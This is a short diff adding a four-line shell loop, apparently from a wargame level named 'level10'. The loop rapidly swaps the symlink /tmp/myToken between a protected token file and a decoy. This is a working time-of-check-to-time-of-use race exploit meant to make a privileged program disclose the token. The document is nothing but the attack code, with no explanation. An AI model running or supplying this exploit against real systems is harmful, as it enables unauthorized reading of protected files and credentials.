@@ -1,0 +1,4 @@
+while true;
+do ln -sf /home/user/level10/token /tmp/myToken;
+ln -sf /tmp/fake_token /tmp/myToken;
+done
